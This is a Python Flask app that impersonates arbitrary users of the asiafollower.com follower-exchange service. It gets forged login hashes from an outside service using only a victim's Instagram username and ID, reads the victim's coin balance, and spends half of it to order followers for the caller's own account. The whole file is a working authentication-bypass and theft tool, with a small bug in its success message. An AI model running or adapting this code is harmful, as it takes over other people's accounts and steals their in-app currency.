import requests
import random,time,base64,os
from flask import *
app=Flask(__name__)
@app.route("/api/v1/marcos/check")
def check():
	
	user=request.args.get("target")
	r = requests.get(f"https://api.dlyar-dev.tk/info-insta?user={user}").json()
	X = r["id"]
	message2 = user
	message_bytes2 = message2.encode('ascii')
	base64_bytes2 = base64.b64encode(message_bytes2)
	base64_message2= base64_bytes2.decode('ascii')
	re = requests.get(f"https://Cipher.mhmdltyy.repl.co?usname={user}&usid={X}&submit=submit").text
#print(re)
#print(re)
	uns = re.split('un:')[1]
	un = uns.split(':un')[0]
#print(un)
#print(un)
	uhlogin = re.split('uhlogin:')[1]
	uhlog = uhlogin.split(':uhlogin')[0]
#print(uhlog)


	keys = re.split('key:')[1]
	key = keys.split(':key')[0]
#print(key)

#print(key)


	uhs = re.split('uh:')[1]
	uh = uhs.split(':uh')[0]

#print(uh)

	ahs= re.split('ah:')[1]
	ah = ahs.split(':ah')[0]

#print(ah)

	aks= re.split('ak:')[1]
	ak = aks.split(':ak')[0]

#print(ak)

	uis= re.split('ui:')[1]
	ui = uis.split(':ui')[0]
#print(ui)

#print(ak)
#________--_____________-________________
	un1= re.split('un1:')[1]
	un1 = un1.split(':un1')[0]

#print(un1)

	uh1= re.split('uh1:')[1]
	uh1 = uh1.split(':uh1')[0]
#print(uh1)

	ak1= re.split('ak1:')[1]
	ak1 = ak1.split(':ak1')[0]
#print(ak1)

	ah1= re.split('ah1:')[1]
	ah1 = ah1.split(':ah1')[0]
#print(ah1)
	un2= re.split('un2:')[1]
	un2 = un2.split(':un')[0]
	#print(un2)
	ah2= re.split('ah2:')[1]
	ah2 = ah2.split(':ah2')[0]
	#print(ah2)
	ak2= re.split('ak2:')[1]
	ak2 = ak2.split(':ak2')[0]
	#print(ak2)

	




	headers = {
    'Host': 'asiafollower.com',
    'content-type': 'application/json; charset=UTF-8',
    # 'content-length': '714',
    # 'accept-encoding': 'gzip',
    'user-agent': 'okhttp/3.14.9',
}

	data = {
  "version_code": 1,
  "market_type": "bazzar",
  "language": "en",
  "u_n": base64_message2,
  "u_h": uhlog+"\u003d\u003d",
  "a_h": ah+"\u003d",
  "a_k": ak,
  "u_i":ui
}
	re = requests.post('https://asiafollower.com/api/v5/loginUser', headers=headers,json=data,proxies=None).text
	if "null" in re:
		return {"coin": "Your Ip Blocked Please Open Super Vpn"}

#print(re)
	if "success" in re:
		take = re.split('"token":"')[1]
		tokens = take.split('"')[0]
		headers = {
    'Host': 'asiafollower.com',
    'token': tokens,
    'content-type': 'application/json; charset=UTF-8',
    # 'content-length': '830',
    # 'accept-encoding': 'gzip',
    'user-agent': 'okhttp/3.14.9',
}
		data = {
  "version_code": 1,
  "market_type": "bazzar",
  "language": "en",
  "u_n": un1+"\u003d",
  "u_h": uh,
  "a_h": ah1+"\u003d",
  "a_k": ak1+"\u003d",
  "username": user
}
		res = requests.post('https://asiafollower.com/api/v5/getUserInfo', 		headers=headers,json=data)
		if res.json()["message"]=="حساب کاربری شما مسدود می باشد!":
			return {"coin": "Username Blocked"}
		res=res.text
		ccs = res.split('"follow_coin":')[1].split(",")[0]
		return {"coin": ccs}
@app.route("/api/v1/marcos/get")
def get1():	
	user=request.args.get("target")
	youruser=request.args.get("username")
	r = requests.get(f"https://api.dlyar-dev.tk/info-insta?user={user}").json()
	X = r["id"]
	r = requests.get(f"https://api.dlyar-dev.tk/info-insta?user={youruser}").json()
	myide = r["id"]
	message2 = user
	message_bytes2 = message2.encode('ascii')
	base64_bytes2 = base64.b64encode(message_bytes2)
	base64_message2= base64_bytes2.decode('ascii')

	re = requests.get(f"https://Cipher.mhmdltyy.repl.co?usname={user}&usid={X}&submit=submit").text
#print(re)
#print(re)
	uns = re.split('un:')[1]
	un = uns.split(':un')[0]
#print(un)
#print(un)
	uhlogin = re.split('uhlogin:')[1]
	uhlog = uhlogin.split(':uhlogin')[0]
#print(uhlog)


	keys = re.split('key:')[1]
	key = keys.split(':key')[0]
#print(key)

#print(key)


	uhs = re.split('uh:')[1]
	uh = uhs.split(':uh')[0]

#print(uh)

	ahs= re.split('ah:')[1]
	ah = ahs.split(':ah')[0]

#print(ah)

	aks= re.split('ak:')[1]
	ak = aks.split(':ak')[0]

#print(ak)

	uis= re.split('ui:')[1]
	ui = uis.split(':ui')[0]
#print(ui)

#print(ak)
#________--_____________-________________
	un1= re.split('un1:')[1]
	un1 = un1.split(':un1')[0]

#print(un1)

	uh1= re.split('uh1:')[1]
	uh1 = uh1.split(':uh1')[0]
#print(uh1)

	ak1= re.split('ak1:')[1]
	ak1 = ak1.split(':ak1')[0]
#print(ak1)

	ah1= re.split('ah1:')[1]
	ah1 = ah1.split(':ah1')[0]
#print(ah1)
	un2= re.split('un2:')[1]
	un2 = un2.split(':un')[0]
	#print(un2)
	ah2= re.split('ah2:')[1]
	ah2 = ah2.split(':ah2')[0]
	#print(ah2)
	ak2= re.split('ak2:')[1]
	ak2 = ak2.split(':ak2')[0]
	#print(ak2)

	




	headers = {
    'Host': 'asiafollower.com',
    'content-type': 'application/json; charset=UTF-8',
    # 'content-length': '714',
    # 'accept-encoding': 'gzip',
    'user-agent': 'okhttp/3.14.9',
}

	data = {
  "version_code": 1,
  "market_type": "bazzar",
  "language": "en",
  "u_n": base64_message2,
  "u_h": uhlog+"\u003d\u003d",
  "a_h": ah+"\u003d",
  "a_k": ak,
  "u_i":ui
}
	re = requests.post('https://asiafollower.com/api/v5/loginUser', headers=headers,json=data,proxies=None).text
	if "null" in re:
		return {"status": "Your Ip Blocked Please Open SuperVpn"}

#print(re)
	if "success" in re:
		take = re.split('"token":"')[1]
		tokens = take.split('"')[0]
		headers = {
    'Host': 'asiafollower.com',
    'token': tokens,
    'content-type': 'application/json; charset=UTF-8',
    # 'content-length': '830',
    # 'accept-encoding': 'gzip',
    'user-agent': 'okhttp/3.14.9',
}
		data = {
  "version_code": 1,
  "market_type": "bazzar",
  "language": "en",
  "u_n": un1+"\u003d",
  "u_h": uh,
  "a_h": ah1+"\u003d",
  "a_k": ak1+"\u003d",
  "username": user
}
		res = requests.post('https://asiafollower.com/api/v5/getUserInfo', 		headers=headers,json=data)
		if res.json()["message"]=="حساب کاربری شما مسدود می باشد!":
			return {"status": "Target Username Blocked"}
#print(res)

		res=res.text
		ccs = res.split('"follow_coin":')[1]
		cccs = ccs.split(',')[0]
		cccl=int(cccs)
		mco= int(cccl / 2)
			
		if int(cccs)>=200:
			data = {
  "version_code": 1,
  "market_type": "bazzar",
  "language": "en",
  "u_n": un2+"\u003d",
  "u_h": uh+"\u003d",
  "a_h": ah2+"\u003d",
  "a_k": ak2+"\u003d",
  "pk": myide,
  "image_url": "https://instagram.fdel3-2.fna.fbcdn.net/v/t51.2885-19/272291055_530654998005277_8614632769092051474_n.jpg?stp\u003ddst-jpg_s150x150\u0026_nc_ht\u003dinstagram.fdel3-2.fna.fbcdn.net\u0026_nc_cat\u003d101\u0026_nc_ohc\u003dXZlqwOYAhuEAX9NlF54\u0026edm\u003dAEF8tYYBAAAA\u0026ccb\u003d7-4\u0026oh\u003d00_AT96ctLMqf2-fiJc-feIwr--oYJgRXR4bULW0nBvAZGJbw\u0026oe\u003d628A1597\u0026_nc_sid\u003da9513d",
  "username": youruser,
  "order_value": "",
  "order_link": youruser,
  "order_type": "follow",
  "order_count": str(mco),
  "start_count": "120647882",
  "is_special": "false",
  "show_pic": "true"
}
			res= requests.post('https://asiafollower.com/api/v5/setOrder', headers=headers,json=data).text
			if "This account has an ongoing order and an order in line, to complete previous orders, please wait." in res:
				return {"status": "Please Complete Order Please Wait 30min"}
			elif "success" in res:
				return {"status": "Successful Send "+mko+" Followers"}
			else:
				return {"status": "Error"}
		else:
			return {"status": "Error Coin"}
			
if __name__ =="__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
